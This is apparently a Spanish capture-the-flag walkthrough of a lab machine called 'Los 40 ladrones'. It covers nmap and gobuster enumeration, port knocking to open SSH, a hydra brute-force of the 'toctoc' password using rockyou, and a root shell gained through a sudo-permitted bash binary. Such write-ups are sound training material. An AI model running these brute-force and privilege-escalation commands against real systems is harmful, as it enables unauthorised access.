# Los 40 ladrones
![image](https://github.com/user-attachments/assets/a47f0df8-8745-432f-83bc-3604923d79c9)


## Reconocimiento y Enumeración.

Comprobar que la máquina está en marcha.

```bash
❯ ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.036 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.036/0.036/0.036/0.000 ms

```

Una vez nos responde ping ya podemos empezar enumerando la máquina. El ttl=64 nos puede indicar que sea una máquina **Linux**.

Lanzamos nmap para ver que puertos nos encuentra.

```bash
sudo nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
```
```
- `-sS`: Realiza un escaneo SYN.
- `-p-`: Escanea todos los puertos.
- `--open`: Muestra solo los puertos abiertos.
- `--min-rate 5000`: Establece la velocidad mínima de envío de paquetes a 5000 por segundo.
- `-vvv`: Genera una salida muy detallada y verbosa.
- `-n`: Evita la resolución de DNS inversa.
- `-Pn`: Omite la detección de hosts.
- `-oG allPorts`: Guarda los resultados en un archivo llamado "allPorts".
- `172.17.0.2`: La dirección IP del host objetivo.
```
```
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
```
Como tenemos abierto el puerto 80, vamos a comprobar la versión y lanzar unos scripts básicos para ver que información obtenemos.

```bash
sudo nmap -sCV -p80 -vvv -oN versionPorts 172.17.0.2
```
```
- `-sCV`: Escaneo de versiones y vulnerabilidades.
- `-p80`: Escaneo de los puertos.
- `-vvv`: Salida muy detallada y verbosa.
- `-oN versionPorts`: Guarda los resultados en "versionPorts".
- `172.17.0.2`: Dirección IP del host escaneado.
```
```
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.58 (Ubuntu)
```
En la página principal vemos la página por defecto de Apache, por lo que vamos a hacer fuzzing con **gobuster**.

```
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```
![image](https://github.com/user-attachments/assets/cc49357e-34fe-4d07-a009-1113f95e770c)

![image](https://github.com/user-attachments/assets/527503ea-c5e6-49fe-99f5-d639bb52c61d)

Nos encontramos con este mensaje en el archivo txt que encontramos con **gobuster** llamado *qdefense.txt*.
A parte de que nos informa de un posible usuario **toctoc**, por la información del fichero podría tratarse de una secuencia de puertos que tendríamos que utilizar para obtener información. Deberemos utilizar la técnica de **Port Knocking**.

*Port Knocking es una técnica de seguridad utilizada para controlar el acceso a servicios en un servidor, como una forma de autenticación antes de permitir la conexión a puertos específicos. La idea principal es que los puertos en un servidor están "cerrados" y no responden a conexiones normales hasta que se haya completado una secuencia particular de intentos de conexión en puertos específicos, conocida como "knock sequence" o secuencia de golpeo.*

**¿Cómo funciona?**

*Secuencia de Golpeo:* El usuario debe intentar conectarse a una serie de puertos en un orden específico. Por ejemplo, primero al puerto 7000, luego al 8000, y finalmente al 9000. Estos intentos pueden hacerse con paquetes de TCP, UDP o ICMP.

*Registro de Golpes:* El servidor está monitoreando los intentos de conexión a estos puertos. No responde a los intentos, pero los registra.

*Verificación de la Secuencia:* Si el servidor detecta que se ha seguido la secuencia correcta de golpes en los puertos, puede activar un script o una regla de firewall que abra el puerto que el usuario quiere acceder (por ejemplo, el puerto 22 para SSH).

*Acceso Permitido:* Una vez que se permite el acceso, el usuario puede conectarse normalmente al puerto deseado.

Primero de todo instalaremos **knock**.
```
sudo apt update && sudo apt install -y knockd
```
Una vez instalado ejecutamos el siguiente comando.

```
knock -v 172.17.0.2 7000 8000 9000
```
![image](https://github.com/user-attachments/assets/14fc05a6-7afb-4e81-9f4a-7d38e09b7136)

Volvemos a hacer un escaneo de puertos y obtendremos acceso al puerto 22.
```
❯ sudo nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 172.17.0.2
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-30 11:27 CEST
Initiating ARP Ping Scan at 11:27
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 11:27, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:27
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 11:28, 26.52s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000076s latency).
Scanned at 2024-07-30 11:27:39 CEST for 26s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```
## Explotación.

Ahora utilizamos **hydra** con el usuario **toctoc** obtenido en el archivo txt, para con fuerza bruta descubrir la contraseña.

```
hydra -l toctoc -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```
![image](https://github.com/user-attachments/assets/8b84f5e5-9528-4c1b-9643-c304376d5eff)

Como hemos obtenido una contraseña, nos conectamos por ssh.
```bash
ssh toctoc@172.17.0.2
```
![image](https://github.com/user-attachments/assets/c2b615e2-42ad-4528-8b18-6987483ff1a6)

## Escalada de privilegios.

Comprobamos si hay algún binario que podamos explotar y nos encontramos con dos opciones.

![image](https://github.com/user-attachments/assets/08908efd-3ecd-49bb-80d7-58499eda20b7)

```bash
sudo -u root /opt/bash -p
```
Ya tenemos acceso como **root**.

![image](https://github.com/user-attachments/assets/d99869ef-ec35-4b98-8c21-bfdb13c2f684)












